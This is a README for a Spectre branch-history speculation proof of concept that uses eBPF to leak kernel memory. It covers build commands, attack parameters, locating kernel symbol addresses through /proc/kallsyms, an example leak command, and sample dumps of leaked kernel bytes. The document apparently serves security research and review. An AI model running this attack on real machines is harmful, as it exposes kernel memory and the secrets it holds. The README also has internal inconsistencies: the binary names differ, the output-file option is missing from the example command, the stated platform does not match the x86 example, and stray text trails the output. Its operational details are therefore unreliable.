# Chimera: A Spectre-BHS Proof of Concept using eBPF

**Chimera** demonstrates exploitation of Branch History Speculation to leak arbitrary memory contents. This proof of concept has been validated on Cortex-A76 processors.

## Building

To build the program:
```bash
make CROSS_COMPILE=aarch64-linux-gnu- ARCH=aarch64
```
or 
```bash
make ARCH=amd64
```

The resulting executable `main.o` can be transferred to and executed on the target device.

## Command Line Parameters

| Parameter                   | Description                                                     | Example                 |
| --------------------------- | --------------------------------------------------------------- | ----------------------- |
| `-a, --addr ADDR_HEX`       | Start address (hex) from which to begin the memory leak         | `-a0xffffd0004c6bc008`  |
| `-l, --len=BYTES`           | Number of bytes to leak                                         | `-l0x10`                |
| `-p, --pass=N`              | Number of leak attempts (defaults to 1 if not provided)         | `-p4`                   |
| `-o, --output=FILE`         | Output file to store the leaked data (optional)                 | `-odump.txt`            |
| `-t, --threshold=THRESHOLD` | Threshold value for FLUSH+RELOAD (F+R) cache probe measurements | `-t100` (example value) |
| `-b, --nr_bh=N`             | Number of branch hints (affects branch history setup)           | `-b512`                 |
| `-s, --sz_bcond=N`          | Size of BHB-populating conditional branches, in instructions    | `-s2`                   |

## Picking an address to leak

To evaluate whether this PoC can leak data from kernel memory, we recommend choosing a kernel memory address with known contents. Reviewers can identify suitable kernel symbol addresses on their own test machine by examining `/proc/kallsyms` (requires root privileges).

For example, you can try leaking the executable section of the `read()` syscall handler:

```bash
sudo cat /proc/kallsyms | sort | grep __x64_sys_read
# ...
ffffffffa211af40 T __x64_sys_read
```

## Example Usage

To dump 64 bytes (`0x40`) of memory starting at the `__x64_sys_read` symbol address, with 4 validation passes, saving the output to `dump.txt`:

```bash
sudo taskset -c 0 ./chimera-ebpf -a0xffffffffa211af40 -l0x40 -p4 -b600 -s2
```

We also recommend adding the options `-b600` and `-s2` when running the PoC. These ensure that the branch history is populated with a sufficient number of branches (`600`), where each branch jumps forward by the given (`2`) opcodes.

### Sample Output

```
Page size: 4096
Start: ffffffffa211af40, Len: 64, Pass: 4
fast: t0: 31, t1: 20, tx: 30
slow: t0: 140, t1: 140, tx: 140
F+R threshold: 83
Pass 0:
ffffffffa211af40: f3 0f 1e fa 0f 1f 44 00 00 48 8b 57 60 48 8b 77   ......D..H.W`H.w
ffffffffa211af50: 68 8b 7f 70 e9 f7 fe ff ff 0f 1f 80 00 00 00 00   h..p............
ffffffffa211af60: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
ffffffffa211af70: 66 0f 1f 00 0f 1f 44 00 00 8b 57 60 8b 77 58 8b   f.....D...W`.wX.

Pass 1:
ffffffffa211af40: f3 0f 1e fa 0f 1f 44 00 00 48 8b 57 60 48 8b 77   ......D..H.W`H.w
ffffffffa211af50: 68 8b 7f 70 e9 f7 fe ff ff 0f 1f 80 00 00 00 00   h..p............
ffffffffa211af60: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
ffffffffa211af70: 66 0f 1f 00 0f 1f 44 00 00 8b 57 60 8b 77 58 8b   f.....D...W`.wX.

Pass 2:
ffffffffa211af40: f3 0f 1e fa 0f 1f 44 00 00 48 8b 57 60 48 8b 77   ......D..H.W`H.w
ffffffffa211af50: 68 8b 7f 70 e9 f7 fe ff ff 0f 1f 80 00 00 00 00   h..p............
ffffffffa211af60: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
ffffffffa211af70: 66 0f 1f 00 0f 1f 44 00 00 8b 57 60 8b 77 58 8b   f.....D...W`.wX.

Pass 3:
ffffffffa211af40: f3 0f 1e fa 0f 1f 44 00 00 48 8b 57 60 48 8b 77   ......D..H.W`H.w
ffffffffa211af50: 68 8b 7f 70 e9 f7 fe ff ff 0f 1f 80 00 00 00 00   h..p............
ffffffffa211af60: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
ffffffffa211af70: 66 0f 1f 00 0f 1f 44 00 00 8b 57 60 8b 77 58 8b   f.....D...W`.wX.

Written to dump.txt:
ffffffffa211af40: f3 0f 1e fa 0f 1f 44 00 00 48 8b 57 60 48 8b 77   ......D..H.W`H.w
ffffffffa211af50: 68 8b 7f 70 e9 f7 fe ff ff 0f 1f 80 00 00 00 00   h..p............
ffffffffa211af60: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
ffffffffa211af70: 66 0f 1f 00 0f 1f 44 00 00 8b 57 60 8b 77 58 8b   f.....D...W`.wX.dolo
```
